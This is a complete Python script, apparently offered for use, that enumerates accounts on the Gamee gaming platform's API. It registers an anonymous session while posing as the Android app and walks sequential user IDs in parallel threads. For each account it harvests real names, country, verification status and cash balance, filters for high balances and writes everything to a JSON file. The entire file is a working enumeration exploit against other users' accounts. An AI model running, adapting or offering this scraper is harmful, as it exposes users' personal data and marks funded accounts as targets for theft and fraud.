#!/usr/bin/env python3
"""
Gamee Account Enumerator & Balance Inspector
Enumerates Gamee accounts by User ID and extracts balance, level, gameplays, and location.
"""

import argparse
import json
import ssl
import sys
import time
import urllib.error
import urllib.request
import uuid
import gzip
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Any, Optional

API_URL = "https://api.gamee.com/"

def get_auth_token(install_uuid: str) -> str:
    ctx = ssl.create_default_context()
    headers = {
        "User-Agent": "Gamee/5.18.2.0 (com.gameeapp.android.app; Android 30; mfr Google; mdl Pixel 8a; disp Pixel 8a; res 1080x2400)",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Client-Language": "en",
        "X-Install-Uuid": install_uuid
    }
    payload = [{
        "jsonrpc": "2.0",
        "id": "reg",
        "method": "user.authentication.registerAnonymousUser",
        "params": {"platform": "app-android", "language": "en", "country": "US", "referralCode": None, "metadata": {}}
    }]
    req = urllib.request.Request(API_URL, data=json.dumps(payload).encode('utf-8'), headers=headers, method="POST")
    with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
        raw = resp.read()
        try:
            raw = gzip.decompress(raw)
        except Exception:
            pass
        data = json.loads(raw.decode('utf-8'))
        return data[0]["result"]["tokens"]["authenticate"]

def fetch_user(uid: int, token: str, install_uuid: str) -> Optional[Dict[str, Any]]:
    ctx = ssl.create_default_context()
    headers = {
        "User-Agent": "Gamee/5.18.2.0 (com.gameeapp.android.app; Android 30; mfr Google; mdl Pixel 8a; disp Pixel 8a; res 1080x2400)",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Client-Language": "en",
        "X-Install-Uuid": install_uuid,
        "Authorization": f"Bearer {token}"
    }
    payload = [{
        "jsonrpc": "2.0",
        "id": f"u_{uid}",
        "method": "user.get",
        "params": {"userId": uid}
    }]
    req = urllib.request.Request(API_URL, data=json.dumps(payload).encode('utf-8'), headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=12) as resp:
            raw = resp.read()
            try:
                raw = gzip.decompress(raw)
            except Exception:
                pass
            res = json.loads(raw.decode('utf-8'))[0]
            if "result" in res and res["result"]:
                r = res["result"]
                gamee = r.get("gamee", {})
                personal = r.get("personal", {})
                about = r.get("about", {})
                return {
                    "id": uid,
                    "nickname": personal.get("nickname") or "N/A",
                    "firstname": personal.get("firstname") or "",
                    "lastname": personal.get("lastname") or "",
                    "country": personal.get("countryId") or "--",
                    "money_usd": round(gamee.get("moneyUsdCents", 0) / 100.0, 2),
                    "xp": gamee.get("experience", 0),
                    "level": gamee.get("level", 1),
                    "level_title": gamee.get("levelTitle") or "rookie",
                    "gameplays": gamee.get("gameplays", 0),
                    "completed_missions": gamee.get("completedMissions", 0),
                    "referral_code": gamee.get("referralCode") or "",
                    "is_anonymous": about.get("isAnonymous", True),
                    "is_verified": personal.get("isVerified", False),
                    "profile_url": gamee.get("profileUrl") or f"https://prizes.gamee.com/profile/{uid}"
                }
    except Exception:
        pass
    return None

def main():
    parser = argparse.ArgumentParser(description="Enumerate Gamee accounts and inspect balances")
    parser.add_argument("--start", type=int, default=139657100, help="Starting User ID (default: 139657100)")
    parser.add_argument("--count", type=int, default=25, help="Number of accounts to check (default: 25)")
    parser.add_argument("--target", type=int, default=None, help="Check a single specific User ID")
    parser.add_argument("--workers", type=int, default=6, help="Concurrent worker threads (default: 6)")
    parser.add_argument("--min-balance", type=float, default=0.0, help="Only show accounts with >= balance (default: 0.0)")
    parser.add_argument("--output", type=str, default="enumerated_accounts.json", help="JSON output file")
    args = parser.parse_args()

    install_uuid = str(uuid.uuid4())
    print("[*] Obtaining temporary API session token...")
    try:
        token = get_auth_token(install_uuid)
    except Exception as e:
        print(f"[-] Failed to obtain token: {e}")
        sys.exit(1)
    print("[+] Session authenticated.\n")

    if args.target:
        uids = [args.target]
    else:
        uids = list(range(args.start, args.start + args.count))

    print(f"[*] Enumerating {len(uids)} accounts using {args.workers} threads...")
    print("=" * 85)
    print(f"{'User ID':<12} {'Nickname':<22} {'Balance':<10} {'Level':<8} {'XP':<6} {'Plays':<7} {'Country':<8}")
    print("=" * 85)

    results = []
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        future_map = {ex.submit(fetch_user, uid, token, install_uuid): uid for uid in uids}
        for future in as_completed(future_map):
            acc = future.result()
            if acc:
                results.append(acc)
                if acc["money_usd"] >= args.min_balance:
                    print(f"{acc['id']:<12} {acc['nickname']:<22} ${acc['money_usd']:<9.2f} Lv.{acc['level']:<5} {acc['xp']:<6} {acc['gameplays']:<7} {acc['country']:<8}")

    results.sort(key=lambda x: x["id"])

    # Save to JSON
    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)

    total_money = sum(a["money_usd"] for a in results)
    avg_money = total_money / len(results) if results else 0.0

    print("=" * 85)
    print(f"[+] Total Accounts Scanned: {len(results)}")
    print(f"[+] Total Cash Discovered:  ${total_money:.2f} USD")
    print(f"[+] Average Balance:        ${avg_money:.2f} USD")
    print(f"[+] Saved complete results to: {args.output}")

if __name__ == "__main__":
    main()
